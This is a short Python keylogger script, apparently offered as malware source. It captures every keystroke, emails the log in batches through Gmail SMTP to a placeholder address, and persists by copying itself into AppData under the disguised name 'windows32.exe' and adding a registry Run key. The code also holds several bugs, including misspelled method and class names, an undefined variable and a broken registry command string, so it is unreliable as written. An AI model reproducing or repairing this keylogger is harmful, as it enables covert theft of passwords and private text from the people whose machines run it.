import keyboard as key 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import os
import subprocess
import shutil
import sys
import datetime

text = ""

while True:
    rec = str(key.read_event())
    
    if rec.__contains__('up'):
        rec = rec.repacle('KeyboardEvent(', '')
        rec = rec.replace(' up)', '')
        
        if len(rec)>1:
            txt = txt + " " + rec + " "
        else: 
            txt = txt + rec
            
    if (len(txt)>=500):
        try:
            msg = MIMEMultipart()
            
            password = "contraseña"
            msg['From'] = "email1"
            msg['To'] = "email2"
            msg['Subject'] = "Report" + str(datetime.datetime.now().date())
            
            msg.attach(MIMEtext(txt, 'plain'))
            
            server = smtplib.SMTP('smtp.gmail.com: 587')
            server.starttls()
            
            server.login(msg['From'], password)
            
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            
            server.quit()
            
            txt = ""
            
            location = os.environ['appdata'] + '\\windows32.exe'
            if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d "'+ location)
                
        except:
            print("error")


            
